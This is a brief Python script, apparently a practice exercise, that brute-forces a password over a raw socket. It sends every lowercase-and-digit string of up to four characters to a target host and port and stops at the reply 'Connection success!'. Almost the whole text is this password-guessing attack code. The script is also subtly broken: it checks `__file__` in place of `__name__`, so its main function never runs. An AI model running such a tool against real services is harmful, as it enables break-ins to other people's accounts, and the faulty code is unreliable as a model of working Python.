#Python3

import sys
import socket
import itertools
import string

#this function receives the parameters from the command line
def get_parameters():
    ip_address = sys.argv[1]
    port = int(sys.argv[2])
    combined = (ip_address, port)
    return combined

def brute_force():
    possible_chars = string.ascii_lowercase + string.digits
    for i in range(1, 5):
        for s in itertools.product(possible_chars, repeat=i):
            yield "".join(s)


def socket_connection(url):
    with socket.socket() as client:
        client.connect(url)
        for message in brute_force():
            client.send(message.encode())
            response = client.recv(1024).decode()
            if "Connection success!" in response:
                return message

def main():
    url = get_parameters()
    password = socket_connection(url)
    print(password)
    


if __file__ == "__main__":
    main()
